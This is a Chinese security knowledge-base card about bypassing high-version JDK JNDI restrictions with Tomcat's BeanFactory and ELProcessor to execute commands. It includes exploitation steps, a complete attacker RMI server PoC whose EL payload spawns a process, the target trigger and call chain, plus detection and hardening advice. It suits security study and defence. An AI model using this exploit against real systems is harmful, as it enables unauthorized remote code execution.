---
id: web-java-deserialization-jndi-high-version-beanfactory-el
title: 高版本 JDK JNDI 绕过：本地 BeanFactory + ELProcessor 执行命令
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-high-version-beanfactory-el
tags:
- java
- jndi
- ldap
- rmi
- beanfactory
- elprocessor
- tomcat
- high-version
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:25:32+08:00'
  notes: 已对照原文与全部 36 张图核对：图12/34/35 证实 decodeObject 在 factoryClassLocation 非空且 trustURLCodebase=false 时抛 ConfigurationException，location 为 null 时继续 NamingManager.getObjectInstance；图13/15/16 证实本地 Tomcat BeanFactory 被加载并 method.invoke(ELProcessor.eval)；图14 计算器佐证 RCE。ResourceRef/forceString=x=eval/ELProcessor 载荷与原图代码一致；卡片对普通 Reference 可能不生效的边界提示与 BeanFactory 实现相符。依赖版本（tomcat-catalina 8.5.0、EL 7.0.26）是复现环境非受影响区间，未设置 versions。PoC 未在本机执行。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-high-version-beanfactory-el/
draft: false
kb_aliases:
- JNDI 高版本绕过
- BeanFactory ELProcessor
- trustURLCodebase 绕过
- ResourceRef BeanFactory
- JNDI 不出网利用
- getFactoryClassLocation null
---

## 一句话结论

高版本 JDK 在 JNDI `decodeObject` 中会检查 `Reference.getFactoryClassLocation()`：只要它非空且 `trustURLCodebase=false` 就抛异常。把 factoryClassLocation 设为空，并让 factoryClassName 指向目标本地已存在的 Tomcat `org.apache.naming.factory.BeanFactory`，即可绕过该检查；BeanFactory 实例化 `javax.el.ELProcessor`，通过 `forceString` 把属性映射到 `eval` 方法，执行 EL 表达式命令。

## 原理

- 低版本 JNDI 利用依赖远程 codebase：`NamingManager.getObjectFactoryFromReference` 先尝试本地类加载，失败后从 `ref.getFactoryClassLocation()` 指向的 URL 加载恶意类。高版本 JDK 在 `RegistryContext.decodeObject` 增加：
  ```java
  if (ref != null && ref.getFactoryClassLocation() != null && !trustURLCodebase) {
      throw new ConfigurationException("The object factory is untrusted...");
  }
  ```
  因此远程 codebase 路径被阻断。
- 绕过思路是“不用远程 codebase，改用目标 classpath 上已有的工厂类”。`Reference` 的 `factoryClassLocation` 设为 `null`，`factoryClassName` 设为本地类；`decodeObject` 检查通过，`NamingManager.getObjectInstance` 继续执行。
- `org.apache.naming.factory.BeanFactory` 是 Tomcat 自带的 `ObjectFactory` 实现，存在于 `tomcat-catalina`。它处理 `ResourceRef` 时：
  1. 用 `beanClassName`（这里是 `javax.el.ELProcessor`）实例化 bean；
  2. 解析 `forceString` 地址，把“属性名=方法名”（如 `x=eval`）建立映射；
  3. 遍历其它 `RefAddr`，对属性 `x` 反射调用 `ELProcessor.eval(value)`。
- `ELProcessor.eval` 会对传入字符串做 EL 求值。文章用 EL 调用 `ScriptEngineManager` 获取 JavaScript 引擎，再执行 `ProcessBuilder`，从而绕开 EL 直接调用 `Runtime` 的限制；如果 EL 环境允许，也可直接调用其它类。
- 该链只依赖目标本地 Tomcat/EL 类，不出网也能执行；若目标没有 Tomcat catalina 或 EL 实现，则链不成立。

## 触发条件

- 存在 JNDI 注入入口（`InitialContext.lookup` 的 URL 可控，或 Log4j/Fastjson 等能触发 JNDI lookup）。
- 目标 JDK 为高版本（默认 `trustURLCodebase=false`），但 classpath 含：
  - `org.apache.naming.factory.BeanFactory`（Tomcat/`tomcat-catalina`）；
  - `javax.el.ELProcessor`（Tomcat EL / `tomcat-embed-el` / 独立 EL 实现）。
- 攻击者能控制 RMI/LDAP 服务返回的 `Reference` 对象。
- 目标未禁用 JNDI 远程 lookup，或未对返回的 Reference 做白名单。

## 利用步骤

1. 确认目标存在 JNDI 注入点，并能访问攻击者的 RMI/LDAP 服务。
2. 在攻击者侧启动 RMI Registry（或 LDAP 服务），构造 `ResourceRef`：
   - `className`/`resourceClass` 为 `javax.el.ELProcessor`；
   - `factoryClassName` 为 `org.apache.naming.factory.BeanFactory`；
   - `factoryClassLocation` 为 `null`；
   - `StringRefAddr("forceString", "x=eval")`；
   - `StringRefAddr("x", "<EL 表达式>")`。
3. 将 Reference 绑定到 RMI 名称，或通过 LDAP 返回。
4. 触发目标 `lookup("rmi://attacker/calc")`；目标加载本地 BeanFactory，实例化 ELProcessor 并调用 `eval`。
5. 观察命令执行（弹计算器、写文件、DNS/HTTP 外带）。
6. 若 EL 被限制，调整 EL 表达式或换用其它本地工厂/二次反序列化链。

## PoC

攻击者 RMI 服务：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(7777);

        ResourceRef ref = new ResourceRef(
            "javax.el.ELProcessor", null, "", "",
            true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x",
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        registry.bind("calc", new ReferenceWrapper(ref));
    }
}
```

目标侧触发：

```java
new InitialContext().lookup("rmi://127.0.0.1:7777/calc");
```

关键调用链：

```text
InitialContext.lookup
 -> RegistryContext.decodeObject
 -> NamingManager.getObjectInstance
 -> NamingManager.getObjectFactoryFromReference
 -> org.apache.naming.factory.BeanFactory.getObjectInstance
 -> javax.el.ELProcessor.eval
 -> ScriptEngineManager/ProcessBuilder
```

## 变体与关联

- 变体：LDAP 服务返回同样的 `ResourceRef`，不依赖 RMI；高版本 JDK 对 LDAP 也有 `trustURLCodebase` 限制，但本地工厂路径同样适用。
- 变体：`forceString` 可把任意属性映射到方法，如 `x=eval`、`y=process`；可调用 ELProcessor 的其它方法。
- 变体：`javax.el.ELProcessor` 可换成目标 classpath 上其它可被 BeanFactory 实例化并调用危险方法的类。
- 变体：如果只改 `factoryClassLocation=null` 但仍使用远程 factory 类名，目标本地不存在该类时仍会失败；必须选本地已有类。
- 关联：[[web-java-deser-c3p0-beanfactory-el-no-egress]]（同样的 BeanFactory+ELProcessor 载荷，入口是 c3p0 反序列化而非 JNDI lookup）。
- 关联：[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]（另一条高版本 JNDI 本地工厂绕过，使用 c3p0）。
- 关联：[[web-java-deserialization-jndi-log4j2-login-rce]]（低版本 JNDI 远程 codebase 入口）。
- 注意：`ResourceRef` 的构造参数与 Tomcat 版本有关；`BeanFactory` 只处理 `ResourceRef`，普通 `Reference` 可能不生效。

## 检测与防御

- 修复：升级 JDK 并保持 `com.sun.jndi.rmi.object.trustURLCodebase`/`com.sun.jndi.ldap.object.trustURLCodebase=false`；仅此不够，本地工厂链仍可利用。
- 加固：禁止应用对不可信 URL 做 JNDI lookup；对 JNDI 返回的 Reference 做类白名单，拒绝 `org.apache.naming.factory.BeanFactory`、`javax.el.ELProcessor` 等本地工厂/EL 类。
- 加固：移除不必要的 Tomcat BeanFactory/EL 依赖，或限制其可实例化的类；对 `ELProcessor.eval`、`ScriptEngineManager` 调用做 RASP 监控。
- 检测：JNDI 请求中出现 `factoryClassName=org.apache.naming.factory.BeanFactory`、`forceString`、`javax.el.ELProcessor`；JVM 加载 BeanFactory/ELProcessor 并出现 `ScriptEngineManager`/`ProcessBuilder` 调用；异常 `ConfigurationException: The object factory is untrusted` 可作为探测信号。
